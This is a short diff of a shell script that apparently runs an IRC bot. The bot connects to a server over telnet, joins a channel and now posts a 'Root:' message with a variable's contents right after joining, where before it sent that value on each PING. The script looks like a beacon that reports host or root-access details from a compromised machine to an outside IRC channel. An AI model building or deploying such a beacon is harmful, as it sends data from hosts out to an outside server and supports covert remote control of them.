@@ -25,14 +25,13 @@ echo $arr4y;
 echo "NICK $random_user" > input 
 echo "USER $user" >> input
 echo "JOIN #$channel" >> input
-sleep 5
+echo "PRIVMSG #$channel :Root: $arr4y :)" >> input
 tail -f input | telnet $server 6667 | while read res
 do
   case "$res" in
     # respond to ping requests from the server
     PING*)
       echo "$res" | sed "s/I/O/" >> input
-      echo "PRIVMSG #$channel :$arr4y" >> input
     ;;
     # for pings on nick/user
     *"You have not"*)
